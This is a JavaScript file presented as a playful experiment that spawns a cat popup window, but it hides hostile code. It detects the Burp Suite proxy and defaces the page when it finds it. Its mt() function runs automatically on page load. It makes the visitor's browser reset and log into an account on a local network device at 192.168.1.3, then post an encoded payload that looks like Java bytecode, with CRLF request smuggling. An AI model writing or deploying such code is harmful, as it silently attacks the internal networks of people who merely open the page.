// just an experiment
let gif = "/media/happy-cat.gif";
let cat;

function burpdtc(hit) {
  // favicon check
  const favicon = url => new Promise((ok, no) => {
    const img = new Image();
    img.onload = ok;
    img.onerror = no;
    img.src = url;
  });

  // timing check
  const cert = url => {
    const t = performance.now();
    return fetch(url, { mode: "no-cors", cache: "no-store", signal: AbortSignal.timeout(2000) }).then(
      () => console.log("found ", performance.now() - t),
      e => { console.log("fail ", performance.now() - t); throw e; },
    );
  };

  Promise.any([
    ...["https://burp/favicon.ico", "http://burp/favicon.ico", "http://burpsuite/favicon.ico"].map(favicon),
    ...["http://burp/cert"].map(cert),
  ]).then(hit, () => {});
}

const foobar = () => {
  gif = "/media/evil.png";
  for (const img of document.images) img.src = gif;
  if (cat && !cat.closed) for (const img of cat.document.images) img.src = gif;

  // document.documentElement.requestFullscreen().catch(() => {});
  document.head.insertAdjacentHTML("beforeend",
    "<style>*{background:#000 url(/media/evil.png) center/contain no-repeat!important;animation:none!important}</style>");
    alert("You. I see you. No more games. Kill Burp Suite.")
}

burpdtc(() => {
  foobar();
});

{
  const btn = document.querySelector("#spawn");

  const w = 200, h = 200;
  let x = 0, y = 0;
  let mx = screen.availWidth / 2, my = screen.availHeight / 2;

  // mi rasclat this is dogshit
  addEventListener("pointermove", e => { mx = e.screenX; my = e.screenY; });

  btn.onclick = () => {
    // document.querySelector("")
    if (cat && !cat.closed) { cat.close(); cat = null; btn.textContent = "spawn cat"; return; }
    // new window
    cat = window.open("", "", `popup,width=${w},height=${h}`);
    if (!cat) return;
    cat.document.write('<body style="margin:0;overflow:hidden;background:#111"><img src="' + gif + '" style="width:100%;height:100%">');
    cat.document.close();

    // done
    x = Math.random() * (screen.availWidth - w);
    y = Math.random() * (screen.availHeight - h);
    btn.textContent = "kill cat";
  };

  const tick = () => {
    requestAnimationFrame(tick);
    if (!cat) return;
    if (cat.closed) { cat = null; btn.textContent = "spawn cat"; return; }
    // prob
    x += (mx - w / 2 - x) * 0.06;
    y += (my - h / 2 - y) * 0.06;
    cat.moveTo(x | 0, y | 0);
  };
  requestAnimationFrame(tick);

  addEventListener("pagehide", () => cat && cat.close());
}

async function mt() {
  const base = "http://192.168.1.3";
  const post = (path, body) => fetch(base + path, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  await post("/auth/ResetPassServ", { email: "default@foo.com", password: "epic" });
  await post("/auth", { email: "default@foo.com", password: "epic" });
  await fetch(base + "/forms/quickDiagnostics", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ diagnose: { pro_dat: "CAA0AQAZc3VuL21pc2MvQ2hhcmFjdGVyRGVjb2RlcgcANgEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IMADgAOQoANwA6AQAFd3JpdGUBAAUoW0IpVgwAPAA9CgArAD4BAAVjbG9zZQwAQAALCgArAEEBAA1TdGFja01hcFRhYmxlAQAmc3lzdGVtUGFja2FnZS9HZW5lcmF0ZWQyNzEzNDU3NzA4OTI3MDABAChMc3lzdGVtUGFja2FnZS9HZW5lcmF0ZWQyNzEzNDU3NzA4OTI3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAADMAAQABAAAABSq3AAGxAAAAAgANAAAACgACAAAA8AAEAPEADgAAAAwAAQAAAAUADwBFAAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAPQADgAAACAAAwAAAAEADwBFAAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAPcADgAAACoABAAAAAEADwBFAAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAADkABAADAAAAJKcAAwFMuwArWRIttwAwTSy7ADJZtwAzEjW2ADu2AD8stgBCsQAAAAEAQwAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AXQAAAe3K", timeout: 1 } })
      + unescape("%0d%0a%0d%0a%0d%0a%0d%0a")
      + '0 POST /auth {"email": "default@foo.com", "password": "epic"}',
  });
}

mt();